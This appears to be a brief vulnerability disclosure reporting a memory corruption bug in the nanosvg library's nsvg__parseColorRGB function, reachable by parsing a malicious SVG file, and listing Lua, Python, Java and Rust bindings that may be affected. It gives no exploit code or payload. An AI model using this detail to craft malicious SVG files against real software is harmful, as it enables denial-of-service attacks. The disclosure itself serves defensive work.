The SVG library nanosvg [0] suffers from a memory corruption bug that can lead to at least DoS. 

The bug exists in the `nsvg__parseColorRGB` function, which can be reached by parsing a malicious SVG file through `nsvgParseFromFile`  or `nsvgParse`. This should also affect libraries/packages that provide bindings to nanosvg, for example:

- Lua: https://github.com/iongion/lunavg
- Python: https://github.com/ethanhs/pynanosvg
- Java: https://javalibs.com/artifact/org.lwjgl/lwjgl-nanovg
- Rust: https://crates.rs/crates/nsvg

More information available in the issue [1] and the blogpost [2].
